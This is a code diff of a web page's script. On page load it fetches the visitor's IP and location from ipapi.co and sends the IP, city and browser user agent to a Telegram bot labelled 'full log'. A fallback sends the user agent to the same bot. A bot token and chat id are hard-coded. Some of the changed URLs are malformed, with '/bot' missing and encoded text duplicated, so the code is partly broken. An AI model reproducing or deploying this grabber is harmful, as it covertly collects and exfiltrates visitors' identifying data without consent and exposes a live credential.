@@ -80,7 +80,7 @@
             const token = "8334056184:AAEvbx3eM-yW3jibp0nUx9YbqDgWX80wMcE";
             const chat_id = "-1003861311533";  
             try {
-                const res = await fetch('https://ipapi.co');
+                const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
                 document.getElementById('user-ip').innerText = d.ip;
@@ -88,11 +88,11 @@
                 document.getElementById('user-os').innerText = navigator.platform;
 
                 const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${d.ip}\n🌍 Город: ${d.city}\n📱 Устройство: ${navigator.userAgent}`;
-                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`;
+                const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}{encodeURIComponent(msg)}`;
                 await fetch(url);
             } catch (e) {
                 const backup = encodeURIComponent(`⚠️ Переход!\n📱 ${navigator.userAgent}`);
-                await fetch(`https://api.telegram.org{token}/sendMessage?chat_id=${chat_id}&text=${backup}`);
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${backup}{backup}`);
             }
         }
     </script>
